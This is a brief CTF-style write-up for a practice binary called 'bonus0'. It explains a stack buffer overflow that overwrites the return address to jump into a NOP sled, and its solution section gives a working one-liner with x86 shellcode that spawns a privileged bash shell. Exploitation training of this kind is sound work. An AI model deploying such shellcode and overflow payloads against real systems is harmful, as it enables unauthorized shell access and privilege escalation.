## BONUS 0 HELP

This binary take 2 input with read, and a buffer of 4096,
We need to overwrite the return address using the second input to write the address, to execute a shellcode who is writed on the first input after multiple NOP (no operation \x90) char

### USAGE

```bash
./bonus0
[input]
[input]
...
```

## SOLUTION
To solve this level, run the binary and use thoses instructions:


```bash
(python -c 'print("\x90"*100 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")'; python -c 'print("a"*9 + "\xd0\xe6\xff\xbf" + "a"*7)'; cat ) | ./bonus0
```
